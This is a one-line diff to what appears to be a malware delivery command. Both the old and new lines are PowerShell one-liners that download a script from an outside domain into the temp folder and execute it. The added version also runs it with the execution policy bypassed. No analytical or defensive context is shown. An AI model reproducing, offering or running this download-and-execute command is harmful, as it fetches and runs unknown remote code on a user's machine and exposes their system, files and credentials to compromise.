@@ -1,1 +1,1 @@
-powershell -C "$p=$env:TEMP\s.ps1; iwr 'http://starlightninjaart.cfd/Ne3fOOeAPjsi6VBS' -OutFile $p; & $p"
+powershell -C "$p=$env:TEMP\s.ps1; iwr 'http://starlightninjaart.cfd/Ne3fOOeAPjsi6VBS' -OutFile $p; & powershell -ExecutionPolicy Bypass $p"
